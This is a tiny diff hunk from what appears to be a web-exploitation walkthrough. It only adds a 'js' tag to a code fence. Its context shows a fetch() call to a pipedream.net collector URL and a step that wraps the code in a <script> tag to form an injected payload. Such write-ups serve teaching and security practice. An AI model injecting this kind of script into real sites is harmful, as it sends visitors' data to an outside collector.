@@ -17,7 +17,7 @@ fetch("https://eo1xxlwzc2rmdlj.m.pipedream.net", options);
 
 ```
 3) Add semicolons to the end of every line. Envelop it with a `<script>` tag. 
-```
+```js
 <script>
 const headers = new Headers();
 headers.append("Content-Type", "application/json");
